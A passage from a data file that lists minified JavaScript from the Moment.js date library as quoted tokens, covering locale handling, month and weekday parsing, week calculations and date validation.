")", "}", "function", "S", "(", "e", ",", "t", ")", "{", "var", "s", ",", "i", "=", "u", "(", "{}", ",", "e", ")", ";", "for", "(", "s", "in", "t", ")", "o", "(", "t", ",", "s", ")", "&&", "(", "n", "(", "e", "[", "s", "]", ")&", "&", "n", "(", "t", "[", "s", "]", ")?", "(", "i", "[", "s", "]", "={", "},", "u", "(", "i", "[", "s", "]", ",", "e", "[", "s", "]", "),", "u", "(", "i", "[", "s", "]", ",", "t", "[", "s", "]", "))", ":", "null", "!", "=", "t", "[", "s", "]", "?", "i", "[", "s", "]", "=", "t", "[", "s", "]", ":", "delete", "i", "[", "s", "]", ");", "for", "(", "s", "in", "e", ")", "o", "(", "e", ",", "s", ")", "&&", "!", "o", "(", "t", ",", "s", ")", "&&", "n", "(", "e", "[", "s", "]", ")&", "&(", "i", "[", "s", "]", "=", "u", "(", "{}", ",", "i", "[", "s", "]", "))", ";", "return", "i", "}", "function", "D", "(", "e", ")", "{", "null", "!", "=", "e", "&", "&", "this", ".", "set", "(", "e", ")", "}", "function", "Y", "(", "e", ",", "t", ")", "{", "var", "n", "=", "e", ".", "toLowerCase", "(", ");", "st", "[", "n", "]", "=", "st", "[", "n", "+", "\"", "s", "\"", "]=", "st", "[", "t", "]", "=", "e", "}", "function", "O", "(", "e", ")", "{", "return", "\"", "string", "\"", "==", "typeof", "e", "?", "st", "[", "e", "]", "||", "st", "[", "e", ".", "toLowerCase", "(", ")]", ":", "void", "0", "}", "function", "x", "(", "e", ")", "{", "var", "t", ",", "n", ",", "s", "=", "{}", ";", "for", "(", "n", "in", "e", ")", "o", "(", "e", ",", "n", ")", "&&", "(", "t", "=", "O", "(", "n", ")", ")&", "&(", "s", "[", "t", "]", "=", "e", "[", "n", "]", ");", "return", "s", "}", "function", "T", "(", "e", ",", "t", ")", "{", "it", "[", "e", "]", "=", "t", "}", "function", "b", "(", "e", ",", "t", ",", "n", ")", "{", "var", "s", "=", "\"\"", "+", "Math", ".", "abs", "(", "e", ")", ",", "i", "=", "t", "-", "s", ".", "length", ";", "return", "(", "e", ">", "=", "0", "?", "n", "?", "\"+", "\":", "\"\"", ":\"", "-\"", ")+", "Math", ".", "pow", "(", "10", ",", "Math", ".", "max", "(", "0", ",", "i", ")", ").", "toString", "(", ").", "substr", "(", "1", ")", "+", "s", "}", "function", "P", "(", "e", ",", "t", ",", "n", ",", "s", ")", "{", "var", "i", "=", "s", ";", "\"", "string", "\"", "==", "typeof", "s", "&", "&(", "i", "=", "function", "(", "){", "return", "this", "[", "s", "]", "()", "})", ",", "e", "&", "&(", "ut", "[", "e", "]", "=", "i", ")", ",", "t", "&", "&(", "ut", "[", "t", "[", "0", "]", "]=", "function", "(", "){", "return", "b", "(", "i", ".", "apply", "(", "this", ",", "arguments", ")", ",", "t", "[", "1", "]", ",", "t", "[", "2", "]", ")}", "),", "n", "&", "&(", "ut", "[", "n", "]", "=", "function", "(", "){", "return", "this", ".", "localeData", "(", ").", "ordinal", "(", "i", ".", "apply", "(", "this", ",", "arguments", ")", ",", "e", ")", "})", "}", "function", "W", "(", "e", ")", "{", "return", "e", ".", "match", "(", "/\\", "[[", "\\", "s", "\\", "S", "]", "/)", "?", "e", ".", "replace", "(", "/^", "\\[", "|\\", "]$", "/", "g", ",", "\"\"", "):", "e", ".", "replace", "(", "/\\", "\\/", "g", ",", "\"\"", ")}", "function", "R", "(", "e", ",", "t", ")", "{", "return", "e", ".", "isValid", "(", ")?", "(", "t", "=", "C", "(", "t", ",", "e", ".", "localeData", "(", "))", ",", "ot", "[", "t", "]", "=", "ot", "[", "t", "]", "||", "function", "(", "e", ")", "{", "var", "t", ",", "n", ",", "s", "=", "e", ".", "match", "(", "rt", ")", ";", "for", "(", "t", "=", "0", ",", "n", "=", "s", ".", "length", ";", "t", "<", "n", ";", "t", "+", "+)", "ut", "[", "s", "[", "t", "]", "]?", "s", "[", "t", "]", "=", "ut", "[", "s", "[", "t", "]", "]:", "s", "[", "t", "]", "=", "W", "(", "s", "[", "t", "]", ");", "return", "function", "(", "t", ")", "{", "var", "i", ",", "r", "=", "\"\"", ";", "for", "(", "i", "=", "0", ";", "i", "<", "n", ";", "i", "+", "+)", "r", "+", "=", "k", "(", "s", "[", "i", "]", ")?", "s", "[", "i", "]", ".", "call", "(", "t", ",", "e", ")", ":", "s", "[", "i", "]", ";", "return", "r", "}", "}(", "t", ")", ",", "ot", "[", "t", "]", "(", "e", ")", "):", "e", ".", "localeData", "(", ").", "invalidDate", "(", ")}", "function", "C", "(", "e", ",", "t", ")", "{", "function", "n", "(", "e", ")", "{", "return", "t", ".", "longDateFormat", "(", "e", ")", "||", "e", "}", "var", "s", "=", "5", ";", "for", "(", "at", ".", "lastIndex", "=", "0", ";", "s", ">", "=", "0", "&", "&", "at", ".", "test", "(", "e", ")", ";)", "e", "=", "e", ".", "replace", "(", "at", ",", "n", ")", ",", "at", ".", "lastIndex", "=", "0", ",", "s", "-", "=", "1", ";", "return", "e", "}", "function", "F", "(", "e", ",", "t", ",", "n", ")", "{", "Yt", "[", "e", "]", "=", "k", "(", "t", ")", "?", "t", ":", "function", "(", "e", ",", "s", ")", "{", "return", "e", "&", "&", "n", "?", "n", ":", "t", "}", "}", "function", "U", "(", "e", ",", "t", ")", "{", "return", "o", "(", "Yt", ",", "e", ")", "?", "Yt", "[", "e", "]", "(", "t", ".", "_strict", ",", "t", ".", "_locale", ")", ":", "new", "RegExp", "(", "function", "(", "e", ")", "{", "return", "N", "(", "e", ".", "replace", "(", "\"\\", "\\\"", ",\"", "\")", ".", "replace", "(", "/\\", "\\(", "\\[", ")|", "\\\\", "(\\", "])", "|\\", "[(", "[^", "\\]", "\\[", "]*", ")\\", "]|", "\\\\", "(.", ")/", "g", ",", "function", "(", "e", ",", "t", ",", "n", ",", "s", ",", "i", ")", "{", "return", "t", "|", "|", "n", "|", "|", "s", "|", "|", "i", "}", "))", "}(", "e", ")", ")}", "function", "N", "(", "e", ")", "{", "return", "e", ".", "replace", "(", "/[", "-\\", "/\\", "\\^", "$*", "+?", ".(", ")|", "[\\", "]{", "}]", "/", "g", ",", "\"\\", "\\$", "&\"", ")}", "function", "H", "(", "e", ",", "t", ")", "{", "var", "n", ",", "s", "=", "t", ";", "for", "(", "\"", "string", "\"", "==", "typeof", "e", "&", "&(", "e", "=", "[", "e", "]", "),", "i", "(", "t", ")", "&&", "(", "s", "=", "function", "(", "e", ",", "n", ")", "{", "n", "[", "t", "]", "=", "g", "(", "e", ")", "})", ",", "n", "=", "0", ";", "n", "<", "e", ".", "length", ";", "n", "+", "+)", "Ot", "[", "e", "[", "n", "]", "]=", "s", "}", "function", "L", "(", "e", ",", "t", ")", "{", "H", "(", "e", ",", "function", "(", "e", ",", "n", ",", "s", ",", "i", ")", "{", "s", ".", "_w", "=", "s", ".", "_w", "|", "|{", "},", "t", "(", "e", ",", "s", ".", "_w", ",", "s", ",", "i", ")", "})", "}", "function", "G", "(", "e", ",", "t", ",", "n", ")", "{", "null", "!", "=", "t", "&", "&", "o", "(", "Ot", ",", "e", ")", "&&", "Ot", "[", "e", "]", "(", "t", ",", "n", ".", "_a", ",", "n", ",", "e", ")", "}", "function", "V", "(", "e", ")", "{", "return", "j", "(", "e", ")", "?", "366", ":", "365", "}", "function", "j", "(", "e", ")", "{", "return", "e", "%", "4", "=", "=", "0", "&", "&", "e", "%", "100", "!", "=", "0", "|", "|", "e", "%", "400", "=", "=", "0", "}", "function", "I", "(", "t", ",", "n", ")", "{", "return", "function", "(", "s", ")", "{", "return", "null", "!", "=", "s", "?", "(", "A", "(", "this", ",", "t", ",", "s", ")", ",", "e", ".", "updateOffset", "(", "this", ",", "n", ")", ",", "this", ")", ":", "E", "(", "this", ",", "t", ")", "}}", "function", "E", "(", "e", ",", "t", ")", "{", "return", "e", ".", "isValid", "(", ")?", "e", ".", "_d", "[", "\"", "get", "\"", "+(", "e", ".", "_isUTC", "?", "\"", "UTC", "\"", ":\"", "\")", "+", "t", "]", "()", ":", "NaN", "}", "function", "A", "(", "e", ",", "t", ",", "n", ")", "{", "e", ".", "isValid", "(", ")&", "&!", "isNaN", "(", "n", ")", "&&", "(\"", "FullYear", "\"", "==", "=", "t", "&", "&", "j", "(", "e", ".", "year", "(", "))", "&&", "1", "=", "==", "e", ".", "month", "(", ")&", "&", "29", "=", "==", "e", ".", "date", "(", ")?", "e", ".", "_d", "[", "\"", "set", "\"", "+(", "e", ".", "_isUTC", "?", "\"", "UTC", "\"", ":\"", "\")", "+", "t", "]", "(", "n", ",", "e", ".", "month", "(", "),", "z", "(", "n", ",", "e", ".", "month", "(", "))", "):", "e", ".", "_d", "[", "\"", "set", "\"", "+(", "e", ".", "_isUTC", "?", "\"", "UTC", "\"", ":\"", "\")", "+", "t", "]", "(", "n", ")", ")}", "function", "z", "(", "e", ",", "t", ")", "{", "if", "(", "isNaN", "(", "e", ")", "||", "isNaN", "(", "t", ")", ")", "return", "NaN", ";", "var", "n", "=", "function", "(", "e", ",", "t", ")", "{", "return", "(", "e", "%", "t", "+", "t", ")", "%", "t", "}", "(", "t", ",", "12", ")", ";", "return", "e", "+", "=(", "t", "-", "n", ")", "/", "12", ",", "1", "=", "==", "n", "?", "j", "(", "e", ")", "?", "29", ":", "28", ":", "31", "-", "n", "%", "7", "%", "2", "}", "function", "Z", "(", "e", ",", "t", ")", "{", "var", "n", ";", "if", "(", "!", "e", ".", "isValid", "(", "))", "return", "e", ";", "if", "(", "\"", "string", "\"", "==", "typeof", "t", ")", "if", "(", "/^", "\\", "d", "+", "$/", ".", "test", "(", "t", ")", ")", "t", "=", "g", "(", "t", ")", ";", "else", "if", "(", "t", "=", "e", ".", "localeData", "(", ").", "monthsParse", "(", "t", ")", ",!", "i", "(", "t", ")", ")", "return", "e", ";", "return", "n", "=", "Math", ".", "min", "(", "e", ".", "date", "(", "),", "z", "(", "e", ".", "year", "(", "),", "t", ")", "),", "e", ".", "_d", "[", "\"", "set", "\"", "+(", "e", ".", "_isUTC", "?", "\"", "UTC", "\"", ":\"", "\")", "+\"", "Month", "\"", "](", "t", ",", "n", ")", ",", "e", "}", "function", "$", "(", "t", ")", "{", "return", "null", "!", "=", "t", "?", "(", "Z", "(", "this", ",", "t", ")", ",", "e", ".", "updateOffset", "(", "this", ",", "!", "0", ")", ",", "this", ")", ":", "E", "(", "this", ",", "\"", "Month", "\"", ")}", "function", "q", "(", "){", "function", "e", "(", "e", ",", "t", ")", "{", "return", "t", ".", "length", "-", "e", ".", "length", "}", "var", "t", ",", "n", ",", "s", "=", "[]", ",", "i", "=", "[]", ",", "r", "=", "[]", ";", "for", "(", "t", "=", "0", ";", "t", "<", "12", ";", "t", "+", "+)", "n", "=", "l", "(", "[", "2e3", ",", "t", "]", "),", "s", ".", "push", "(", "this", ".", "monthsShort", "(", "n", ",", "\"\"", "))", ",", "i", ".", "push", "(", "this", ".", "months", "(", "n", ",", "\"\"", "))", ",", "r", ".", "push", "(", "this", ".", "months", "(", "n", ",", "\"\"", "))", ",", "r", ".", "push", "(", "this", ".", "monthsShort", "(", "n", ",", "\"\"", "))", ";", "for", "(", "s", ".", "sort", "(", "e", ")", ",", "i", ".", "sort", "(", "e", ")", ",", "r", ".", "sort", "(", "e", ")", ",", "t", "=", "0", ";", "t", "<", "12", ";", "t", "+", "+)", "s", "[", "t", "]", "=", "N", "(", "s", "[", "t", "]", "),", "i", "[", "t", "]", "=", "N", "(", "i", "[", "t", "]", ");", "for", "(", "t", "=", "0", ";", "t", "<", "24", ";", "t", "+", "+)", "r", "[", "t", "]", "=", "N", "(", "r", "[", "t", "]", ");", "this", ".", "_monthsRegex", "=", "new", "RegExp", "(", "\"^", "(\"", "+", "r", ".", "join", "(", "\"|", "\")", "+\"", ")\"", ",\"", "i", "\"", "),", "this", ".", "_monthsShortRegex", "=", "this", ".", "_monthsRegex", ",", "this", ".", "_monthsStrictRegex", "=", "new", "RegExp", "(", "\"^", "(\"", "+", "i", ".", "join", "(", "\"|", "\")", "+\"", ")\"", ",\"", "i", "\"", "),", "this", ".", "_monthsShortStrictRegex", "=", "new", "RegExp", "(", "\"^", "(\"", "+", "s", ".", "join", "(", "\"|", "\")", "+\"", ")\"", ",\"", "i", "\"", ")}", "function", "J", "(", "e", ")", "{", "var", "t", "=", "new", "Date", "(", "Date", ".", "UTC", ".", "apply", "(", "null", ",", "arguments", ")", ");", "return", "e", "<", "100", "&", "&", "e", ">", "=", "0", "&", "&", "isFinite", "(", "t", ".", "getUTCFullYear", "(", "))", "&&", "t", ".", "setUTCFullYear", "(", "e", ")", ",", "t", "}", "function", "B", "(", "e", ",", "t", ",", "n", ")", "{", "var", "s", "=", "7", "+", "t", "-", "n", ";", "return", "-", "((", "7", "+", "J", "(", "e", ",", "0", ",", "s", ")", ".", "getUTCDay", "(", ")-", "t", ")", "%", "7", ")", "+", "s", "-", "1", "}", "function", "Q", "(", "e", ",", "t", ",", "n", ",", "s", ",", "i", ")", "{", "var", "r", ",", "a", ",", "o", "=", "1", "+", "7", "*", "(", "t", "-", "1", ")", "+(", "7", "+", "n", "-", "s", ")", "%", "7", "+", "B", "(", "e", ",", "s", ",", "i", ")", ";", "return", "o", "<", "=", "0", "?", "a", "=", "V", "(", "r", "=", "e", "-", "1", ")", "+", "o", ":", "o", ">", "V", "(", "e", ")", "?(", "r", "=", "e", "+", "1", ",", "a", "=", "o", "-", "V", "(", "e", ")", "):", "(", "r", "=", "e", ",", "a", "=", "o", ")", ",{", "year", ":", "r", ",", "dayOfYear", ":", "a", "}", "}", "function", "X", "(", "e", ",", "t", ",", "n", ")", "{", "var", "s", ",", "i", ",", "r", "=", "B", "(", "e", ".", "year", "(", "),", "t", ",", "n", ")", ",", "a", "=", "Math", ".", "floor", "(", "(", "e", ".", "dayOfYear", "(", ")-", "r", "-", "1", ")", "/", "7", ")", "+", "1", ";", "return", "a", "<", "1", "?", "s", "=", "a", "+", "K", "(", "i", "=", "e", ".", "year", "(", ")-", "1", ",", "t", ",", "n", ")", ":", "a", ">", "K", "(", "e", ".", "year", "(", "),", "t", ",", "n", ")", "?(", "s", "=", "a", "-", "K", "(", "e", ".", "year", "(", "),", "t", ",", "n", ")", ",", "i", "=", "e", ".", "year", "(", ")+", "1", ")", ":(", "i", "=", "e", ".", "year", "(", "),", "s", "=", "a", ")", ",{", "week", ":", "s", ",", "year", ":", "i", "}", "}", "function", "K", "(", "e", ",", "t", ",", "n", ")", "{", "var", "s", "=", "B", "(", "e", ",", "t", ",", "n", ")", ",", "i", "=", "B", "(", "e", "+", "1", ",", "t", ",", "n", ")", ";", "return", "(", "V", "(", "e", ")", "-", "s", "+", "i", ")", "/", "7", "}", "function", "ee", "(", "){", "function", "e", "(", "e", ",", "t", ")", "{", "return", "t", ".", "length", "-", "e", ".", "length", "}", "var", "t", ",", "n", ",", "s", ",", "i", ",", "r", ",", "a", "=", "[]", ",", "o", "=", "[]", ",", "u", "=", "[]", ",", "d", "=", "[]", ";", "for", "(", "t", "=", "0", ";", "t", "<", "7", ";", "t", "+", "+)", "n", "=", "l", "(", "[", "2e3", ",", "1", "]", ").", "day", "(", "t", ")", ",", "s", "=", "this", ".", "weekdaysMin", "(", "n", ",", "\"\"", "),", "i", "=", "this", ".", "weekdaysShort", "(", "n", ",", "\"\"", "),", "r", "=", "this", ".", "weekdays", "(", "n", ",", "\"\"", "),", "a", ".", "push", "(", "s", ")", ",", "o", ".", "push", "(", "i", ")", ",", "u", ".", "push", "(", "r", ")", ",", "d", ".", "push", "(", "s", ")", ",", "d", ".", "push", "(", "i", ")", ",", "d", ".", "push", "(", "r", ")", ";", "for", "(", "a", ".", "sort", "(", "e", ")", ",", "o", ".", "sort", "(", "e", ")", ",", "u", ".", "sort", "(", "e", ")", ",", "d", ".", "sort", "(", "e", ")", ",", "t", "=", "0", ";", "t", "<", "7", ";", "t", "+", "+)", "o", "[", "t", "]", "=", "N", "(", "o", "[", "t", "]", "),", "u", "[", "t", "]", "=", "N", "(", "u", "[", "t", "]", "),", "d", "[", "t", "]", "=", "N", "(", "d", "[", "t", "]", ");", "this", ".", "_weekdaysRegex", "=", "new", "RegExp", "(", "\"^", "(\"", "+", "d", ".", "join", "(", "\"|", "\")", "+\"", ")\"", ",\"", "i", "\"", "),", "this", ".", "_weekdaysShortRegex", "=", "this", ".", "_weekdaysRegex", ",", "this", ".", "_weekdaysMinRegex", "=", "this", ".", "_weekdaysRegex", ",", "this", ".", "_weekdaysStrictRegex", "=", "new", "RegExp", "(", "\"^", "(\"", "+", "u", ".", "join", "(", "\"|", "\")", "+\"", ")\"", ",\"", "i", "\"", "),", "this", ".", "_weekdaysShortStrictRegex", "=", "new", "RegExp", "(", "\"^", "(\"", "+", "o", ".", "join", "(", "\"|", "\")", "+\"", ")\"", ",\"", "i", "\"", "),", "this", ".", "_weekdaysMinStrictRegex", "=", "new", "RegExp", "(", "\"^", "(\"", "+", "a", ".", "join", "(", "\"|", "\")", "+\"", ")\"", ",\"", "i", "\"", ")}", "function", "te", "(", "){", "return", "this", ".", "hours", "(", ")%", "12", "|", "|", "12", "}", "function", "ne", "(", "e", ",", "t", ")", "{", "P", "(", "e", ",", "0", ",", "0", ",", "function", "(", "){", "return", "this", ".", "localeData", "(", ").", "meridiem", "(", "this", ".", "hours", "(", "),", "this", ".", "minutes", "(", "),", "t", ")", "})", "}", "function", "se", "(", "e", ",", "t", ")", "{", "return", "t", ".", "_meridiemParse", "}", "function", "ie", "(", "e", ")", "{", "return", "e", "?", "e", ".", "toLowerCase", "(", ").", "replace", "(", "\"", "_", "\"", ",\"", "-\"", "):", "e", "}", "function", "re", "(", "e", ")", "{", "var", "t", "=", "null", ";", "if", "(", "!", "Xt", "[", "e", "]", "&&", "\"", "undefined", "\"", "!=", "typeof", "module", "&", "&", "module", "&", "&", "module", ".", "exports", ")", "try", "{", "t", "=", "Jt", ".", "_abbr", ";", "require", "(", "\".", "/", "locale", "/", "\"+", "e", ")", ",", "ae", "(", "t", ")", "}", "catch", "(", "e", ")", "{}", "return", "Xt", "[", "e", "]", "}", "function", "ae", "(", "e", ",", "t", ")", "{", "var", "n", ";", "return", "e", "&", "&(", "n", "=", "s", "(", "t", ")", "?", "ue", "(", "e", ")", ":", "oe", "(", "e", ",", "t", ")", ")&", "&(", "Jt", "=", "n", ")", ",", "Jt", ".", "_abbr", "}", "function", "oe", "(", "e", ",", "t", ")", "{", "if", "(", "null", "!", "==", "t", ")", "{", "var", "n", "=", "Qt", ";", "if", "(", "t", ".", "abbr", "=", "e", ",", "null", "!", "=", "Xt", "[", "e", "]", ")", "M", "(", "\"", "defineLocaleOverride", "\"", ",\"", "use", "moment", ".", "updateLocale", "(", "localeName", ",", "config", ")", "to", "change", "an", "existing", "locale", ".", "moment", ".", "defineLocale", "(", "localeName", ",", "config", ")", "should", "only", "be", "used", "for", "creating", "a", "new", "locale", "See", "http", ":", "//", "momentjs", ".", "com", "/", "guides", "/", "#/", "warnings", "/", "define", "-", "locale", "/", "for", "more", "info", ".", "\")", ",", "n", "=", "Xt", "[", "e", "]", ".", "_config", ";", "else", "if", "(", "null", "!", "=", "t", ".", "parentLocale", ")", "{", "if", "(", "null", "=", "=", "Xt", "[", "t", ".", "parentLocale", "]", ")", "return", "Kt", "[", "t", ".", "parentLocale", "]", "||", "(", "Kt", "[", "t", ".", "parentLocale", "]", "=[", "])", ",", "Kt", "[", "t", ".", "parentLocale", "]", ".", "push", "(", "{", "name", ":", "e", ",", "config", ":", "t", "}", "),", "null", ";", "n", "=", "Xt", "[", "t", ".", "parentLocale", "]", ".", "_config", "}", "return", "Xt", "[", "e", "]", "=", "new", "D", "(", "S", "(", "n", ",", "t", ")", "),", "Kt", "[", "e", "]", "&&", "Kt", "[", "e", "]", ".", "forEach", "(", "function", "(", "e", ")", "{", "oe", "(", "e", ".", "name", ",", "e", ".", "config", ")", "})", ",", "ae", "(", "e", ")", ",", "Xt", "[", "e", "]", "}", "return", "delete", "Xt", "[", "e", "]", ",", "null", "}", "function", "ue", "(", "e", ")", "{", "var", "n", ";", "if", "(", "e", "&", "&", "e", ".", "_locale", "&", "&", "e", ".", "_locale", ".", "_abbr", "&", "&(", "e", "=", "e", ".", "_locale", ".", "_abbr", ")", ",!", "e", ")", "return", "Jt", ";", "if", "(", "!", "t", "(", "e", ")", "){", "if", "(", "n", "=", "re", "(", "e", ")", ")", "return", "n", ";", "e", "=", "[", "e", "]", "}", "return", "function", "(", "e", ")", "{", "for", "(", "var", "t", ",", "n", ",", "s", ",", "i", ",", "r", "=", "0", ";", "r", "<", "e", ".", "length", ";", "){", "for", "(", "t", "=", "(", "i", "=", "ie", "(", "e", "[", "r", "]", ").", "split", "(", "\"-", "\")", ").", "length", ",", "n", "=", "(", "n", "=", "ie", "(", "e", "[", "r", "+", "1", "]", "))", "?", "n", ".", "split", "(", "\"-", "\")", ":", "null", ";", "t", ">", "0", ";", "){", "if", "(", "s", "=", "re", "(", "i", ".", "slice", "(", "0", ",", "t", ")", ".", "join", "(", "\"-", "\")", "))", "return", "s", ";", "if", "(", "n", "&", "&", "n", ".", "length", ">", "=", "t", "&", "&", "p", "(", "i", ",", "n", ",", "!", "0", ")", ">=", "t", "-", "1", ")", "break", ";", "t", "-", "-}", "r", "+", "+}", "return", "null", "}", "(", "e", ")", "}", "function", "le", "(", "e", ")", "{", "var", "t", ",", "n", "=", "e", ".", "_a", ";", "return", "n", "&", "&-", "2", "=", "==", "d", "(", "e", ")", ".", "overflow", "&", "&(", "t", "=", "n", "[", "Tt", "]", "<", "0", "|", "|", "n", "[", "Tt", "]", ">", "11", "?", "Tt", ":", "n", "[", "bt", "]", "<", "1", "|", "|", "n", "[", "bt", "]", ">", "z", "(", "n", "[", "xt", "]", ",", "n", "[", "Tt", "]", ")?", "bt", ":", "n", "[", "Pt", "]", "<", "0", "|", "|", "n", "[", "Pt", "]", ">", "24", "|", "|", "24", "=", "==", "n", "[", "Pt", "]", "&&", "(", "0", "!", "==", "n", "[", "Wt", "]", "||", "0", "!", "==", "n", "[", "Rt", "]", "||", "0", "!", "==", "n", "[", "Ct", "]", ")?", "Pt", ":", "n", "[", "Wt", "]", "<", "0", "|", "|", "n", "[", "Wt", "]", ">", "59", "?", "Wt", ":", "n", "[", "Rt", "]", "<", "0", "|", "|", "n", "[", "Rt", "]", ">", "59", "?", "Rt", ":", "n", "[", "Ct", "]", "<", "0", "|", "|", "n", "[", "Ct", "]", ">", "999", "?", "Ct", ":", "-", "1", ",", "d", "(", "e", ")", ".", "_overflowDayOfYear", "&", "&(", "t", "<", "xt", "|", "|", "t", ">", "bt", ")", "&&", "(", "t", "=", "bt", ")", ",", "d", "(", "e", ")", ".", "_overflowWeeks", "&", "&-", "1", "=", "==", "t", "&", "&(", "t", "=", "Ft", ")", ",", "d", "(", "e", ")", ".", "_overflowWeekday", "&", "&-", "1", "=", "==", "t", "&", "&(", "t", "=", "Ut", ")", ",", "d", "(", "e", ")", ".", "overflow", "=", "t", ")", ",", "e", "}", "function", "de", "(", "e", ",", "t", ",", "n", ")", "{", "return", "null", "!", "=", "e", "?", "e", ":", "null", "!", "=", "t", "?", "t", ":", "n", "}", "function", "he", "(", "t", ")", "{", "var", "n", ",", "s", ",", "i", ",", "r", ",", "a", "=", "[]", ";", "if", "(", "!", "t", ".", "_d", ")", "{", "for", "(", "i", "=", "function", "(", "t", ")", "{", "var", "n", "=", "new", "Date", "(", "e", ".", "now", "(", "))", ";", "return", "t", ".", "_useUTC", "?", "[", "n", ".", "getUTCFullYear", "(", "),", "n", ".", "getUTCMonth", "(", "),", "n", ".", "getUTCDate", "(", ")]", ":[", "n", ".", "getFullYear", "(", "),", "n", ".", "getMonth", "(", "),", "n", ".", "getDate", "(", ")]", "}(", "t", ")", ",", "t", ".", "_w", "&", "&", "null", "=", "=", "t", ".", "_a", "[", "bt", "]", "&&", "null", "=", "=", "t", ".", "_a", "[", "Tt", "]", "&&", "function", "(", "e", ")", "{", "var", "t", ",", "n", ",", "s", ",", "i", ",", "r", ",", "a", ",", "o", ",", "u", ";", "if", "(", "null", "!", "=(", "t", "=", "e", ".", "_w", ")", ".", "GG", "|", "|", "null", "!", "=", "t", ".", "W", "|", "|", "null", "!", "=", "t", ".", "E", ")", "r", "=", "1", ",", "a", "=", "4", ",", "n", "=", "de", "(", "t", ".", "GG", ",", "e", ".", "_a", "[", "xt", "]", ",", "X", "(", "pe", "(", "),", "1", ",", "4", ")", ".", "year", ")", ",", "s", "=", "de", "(", "t", ".", "W", ",", "1", ")", ",(", "(", "i", "=", "de", "(", "t", ".", "E", ",", "1", ")", ")<", "1", "|", "|", "i", ">", "7", ")", "&&", "(", "u", "=", "!", "0", ")", ";", "else", "{", "r", "=", "e", ".", "_locale", ".", "_week", ".", "dow", ",", "a", "=", "e", ".", "_locale", ".", "_week", ".", "doy", ";", "var", "l", "=", "X", "(", "pe", "(", "),", "r", ",", "a", ")", ";", "n", "=", "de", "(", "t", ".", "gg", ",", "e", ".", "_a", "[", "xt", "]", ",", "l", ".", "year", ")", ",", "s", "=", "de", "(", "t", ".", "w", ",", "l", ".", "week", ")", ",", "null", "!", "=", "t", ".", "d", "?", "((", "i", "=", "t", ".", "d", ")", "<", "0", "|", "|", "i", ">", "6", ")", "&&", "(", "u", "=", "!", "0", ")", ":", "null", "!", "=", "t", ".", "e", "?", "(", "i", "=", "t", ".", "e", "+", "r", ",", "(", "t", ".", "e", "<", "0", "|", "|", "t", ".", "e", ">", "6", ")", "&&", "(", "u", "=", "!", "0", ")", "):", "i", "=", "r", "}", "s", "<", "1", "|", "|", "s", ">", "K", "(", "n", ",", "r", ",", "a", ")", "?", "d", "(", "e", ")", ".", "_overflowWeeks", "=", "!", "0", ":", "null", "!", "=", "u", "?", "d", "(", "e", ")", ".", "_overflowWeekday", "=", "!", "0", ":", "(", "o", "=", "Q", "(", "n", ",", "s", ",", "i", ",", "r", ",", "a", ")", ",", "e", ".", "_a", "[", "xt", "]", "=", "o", ".", "year", ",", "e", ".", "_dayOfYear", "=", "o", ".", "dayOfYear", ")", "}(", "t", ")", ",", "null", "!", "=", "t", ".", "_dayOfYear", "&", "&(", "r", "=", "de", "(", "t", ".", "_a", "[", "xt", "]", ",", "i", "[", "xt", "]", "),", "(", "t", ".", "_dayOfYear", ">", "V", "(", "r", ")", "||", "0", "=", "==", "t", ".", "_dayOfYear", ")", "&&", "(", "d", "(", "t", ")", ".", "_overflowDayOfYear", "=", "!", "0", ")", ",", "s", "=", "J", "(", "r", ",", "0", ",", "t", ".", "_dayOfYear", ")", ",", "t", ".", "_a", "[", "Tt", "]", "=", "s", ".", "getUTCMonth", "(", "),", "t", ".", "_a", "[", "bt", "]", "=", "s", ".", "getUTCDate", "(", "))", ",", "n", "=", "0", ";", "n", "<", "3", "&", "&", "null", "=", "=", "t", ".", "_a", "[", "n", "]", ";+", "+", "n", ")", "t", ".", "_a", "[", "n", "]", "=", "a", "[", "n", "]", "=", "i", "[", "n", "]", ";", "for", "(", ";", "n", "<", "7", ";", "n", "+", "+)", "t", ".", "_a", "[", "n", "]", "=", "a", "[", "n", "]", "=", "null", "=", "=", "t", ".", "_a", "[", "n", "]", "?", "2", "=", "==", "n", "?", "1", ":", "0", ":", "t", ".", "_a", "[", "n", "]", ";", "24", "=", "==", "t", ".", "_a", "[", "Pt", "]", "&&", "0", "=", "==", "t", ".", "_a", "[", "Wt", "]", "&&", "0", "=", "==", "t", ".", "_a", "[", "Rt", "]", "&&", "0", "=", "==", "t", ".", "_a", "[", "Ct", "]", "&&", "(", "t", ".", "_nextDay", "=", "!", "0", ",", "t", ".", "_a", "[", "Pt", "]", "=", "0", ")", ",", "t", ".", "_d", "=", "(", "t", ".", "_useUTC", "?", "J", ":", "function", "(", "e", ",", "t", ",", "n", ",", "s", ",", "i", ",", "r", ",", "a", ")", "{", "var", "o", "=", "new", "Date", "(", "e", ",", "t", ",", "n", ",", "s", ",", "i", ",", "r", ",", "a", ")", ";", "return", "e", "<", "100", "&", "&", "e", ">", "=", "0", "&", "&", "isFinite", "(", "o", ".", "getFullYear", "(", "))", "&&", "o", ".", "setFullYear", "(", "e", ")", ",", "o", "}", ").", "apply", "(", "null", ",", "a", ")", ",", "null", "!", "=", "t", ".", "_tzm", "&", "&", "t", ".", "_d", ".", "setUTCMinutes", "(", "t", ".", "_d", ".", "getUTCMinutes", "(", ")-", "t", ".", "_tzm", ")", ",", "t", ".", "_nextDay", "&", "&(", "t", ".", "_a", "[", "Pt", "]", "=", "24", ")", ",", "t", ".", "_w", "&", "&", "void", "0", "!", "==", "t", ".", "_w", ".", "d", "&", "&", "t", ".", "_w", ".", "d", "!", "==", "t", ".", "_d", ".", "getDay", "(", ")&", "&(", "d", "(", "t", ")", ".", "weekdayMismatch", "=", "!", "0", ")", "}}", "function", "ce", "(", "e", ")", "{", "var", "t", ",", "n", ",", "s", ",", "i", ",", "r", ",", "a", ",", "o", "=", "e", ".", "_i", ",", "u", "=", "en", ".", "exec", "(", "o", ")", "||", "tn", ".", "exec", "(", "o", ")", ";", "if", "(", "u", ")", "{", "for", "(", "d", "(", "e", ")", ".", "iso", "=", "!", "0", ",", "t", "=", "0", ",", "n", "=", "sn", ".", "length", ";", "t", "<", "n", ";", "t", "+", "+)", "if", "(", "sn", "[", "t", "]", "[", "1", "]", ".", "exec", "(", "u", "[", "1", "]", "))", "{", "i", "=", "sn", "[", "t", "]", "[", "0", "]", ",", "s", "=", "!", "1", "!", "==", "sn", "[", "t", "]", "[", "2", "]", ";", "break", "}", "if", "(", "null", "=", "=", "i", ")", "return", "void", "(", "e", ".", "_isValid", "=", "!", "1", ")", ";", "if", "(", "u", "[", "3", "]", "){", "for", "(", "t", "=", 